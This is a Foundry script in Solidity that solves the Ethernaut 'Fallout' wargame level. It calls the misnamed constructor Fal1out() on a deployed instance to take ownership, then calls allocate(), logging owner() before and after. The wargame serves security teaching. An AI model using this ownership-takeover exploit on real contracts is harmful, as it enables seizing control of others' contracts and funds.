//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {Fallout} from "../src/ethernaut2.sol";
import {console} from "forge-std/console.sol";

contract ethernaut2Script is Script{
    Fallout instance = Fallout(payable(0x8c4D79642E1d68c8cD2D65250dCDA711d09fe258));
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log(instance.owner());
        instance.Fal1out();
        instance.allocate();
        console.log(instance.owner());
        vm.stopBroadcast();
    }
}